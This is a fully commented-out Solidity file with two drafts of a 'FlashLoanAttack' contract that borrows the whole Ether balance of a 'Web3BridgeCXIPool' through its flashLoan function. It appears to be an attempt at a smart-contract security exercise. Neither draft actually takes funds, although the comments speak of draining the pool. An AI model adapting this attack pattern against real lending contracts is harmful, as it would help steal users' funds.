// // pragma solidity ^0.8.17;

// // import {Web3BridgeCXIPool} from "src/web3bridgecxipool.sol"; // Adjust the import path as necessary

// // interface IFlashLoanEtherReceiver {
// //     function execute() external payable;
// // }

// // contract FlashLoanAttack is IFlashLoanEtherReceiver {
// //     Web3BridgeCXIPool public pool;

// //     constructor(address _pool) {
// //         pool = Web3BridgeCXIPool(_pool);
// //     }

// //     function execute() external payable override {
// //         // The attack logic can be placed here; however, it will not be executed.
// //         // The pool's flashLoan function is exploited directly by calling attack().
// //     }

// //     function attack() external {
// //         // Call flashLoan to borrow all Ether in the pool.
// //         pool.flashLoan(address(pool).balance);
// //     }
// // }


// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.17;

// import {Web3BridgeCXIPool} from "src/web3bridgecxipool.sol"; // Adjust the import path as necessary

// interface IFlashLoanEtherReceiver {
//     function execute() external payable;
// }

// contract FlashLoanAttack is IFlashLoanEtherReceiver {
//     Web3BridgeCXIPool public pool;

//     constructor(address _pool) {
//         pool = Web3BridgeCXIPool(_pool);
//     }

//     function execute() external payable override {
//         // Perform the attack logic here
//         // For example, you can just drain the pool funds
//         // But you also need to ensure the flash loan is paid back

//         // Send back the funds borrowed in the flash loan
//         uint256 amountBorrowed = msg.value; // Amount borrowed in the flash loan
//         (bool success, ) = address(pool).call{value: amountBorrowed}("");
//         require(success, "Failed to pay back the flash loan");
//     }

//     function attack() external {
//         // Call flashLoan to borrow all Ether in the pool.
//         pool.flashLoan(address(pool).balance);
//     }
// }
